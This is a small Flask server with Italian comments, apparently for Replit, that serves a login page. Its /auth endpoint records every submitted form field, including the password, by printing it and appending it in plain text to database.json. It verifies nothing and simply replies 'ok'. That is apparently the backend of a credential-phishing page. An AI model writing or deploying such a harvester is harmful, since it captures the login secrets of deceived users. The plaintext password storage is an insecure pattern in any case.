from flask import Flask, render_template, request, make_response
import os
import json

app = Flask(__name__)

# Endpoint per ricevere la password
@app.route("/auth", methods=["POST"])
def auth():
    data = request.form.to_dict()  # prende i dati dal form
    print(data)  # li stampa sulla console per debug

    # Salva i dati in database.json
    with open("database.json", "a") as f:
        f.write(json.dumps(data) + "\n")

    return "ok"

# Pagina login
@app.route("/")
def index():
    response = make_response(render_template("login.html"))
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # necessario per Replit
    app.run(host="0.0.0.0", port=port)
